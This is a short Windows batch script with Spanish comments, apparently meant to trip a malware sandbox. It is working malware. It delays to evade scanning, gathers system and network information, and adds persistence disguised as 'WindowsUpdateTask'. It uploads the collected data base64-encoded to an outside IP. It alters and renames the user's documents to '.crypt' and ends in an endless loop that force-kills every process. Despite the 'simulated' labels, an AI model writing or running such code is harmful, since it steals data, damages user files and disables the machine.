@echo off
:: [ANTI-ANALYSIS & EVASION] - Dormimos el proceso para saltar el escaneo inicial
timeout /t 100 /nobreak >nul

:: [RECONNAISSANCE] - Recopilamos info del sistema y la guardamos en un sitio oculto
systeminfo > %temp%\syslog.dat
netstat -ano >> %temp%\syslog.dat

:: [PERSISTENCE] - Nos metemos en el arranque pero con un nombre que parece de Windows
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateTask" /t REG_SZ /d "%~f0" /f

:: [NETWORK EXFILTRATION] - Simulamos el robo de datos enviando el log a una IP "atacante"
:: (Usamos una IP de ejemplo que Triage marcará como Command & Control)
powershell -Command "Invoke-WebRequest -Uri 'http://185.199.108.153/log?data=' + [Convert]::ToBase64String([IO.File]::ReadAllBytes('%temp%\syslog.dat'))" -UseBasicParsing

:: [SIMULATED RANSOMWARE] - Cifrado rápido de archivos del usuario
:: No solo borra, simula un bucle de cifrado que Triage detecta por comportamiento
set "target=%userprofile%\Documents"
for /r "%target%" %%f in (*.docx, *.pdf, *.xlsx) do (
    powershell -Command "Add-Content -Path '%%f' -Value 'ENCRYPTED_BY_V11_ELITE'"
    ren "%%f" "%%~nxf.crypt"
)

:: [PAYLOAD: DESTRUCTIVE LOOP] - El bucle que ya conoces, pero más rápido
:FINAL_ATTACK
start /min cmd /c "tree c:\ /f"
start /min powershell -Command "Get-Process | Stop-Process -Force"
goto FINAL_ATTACK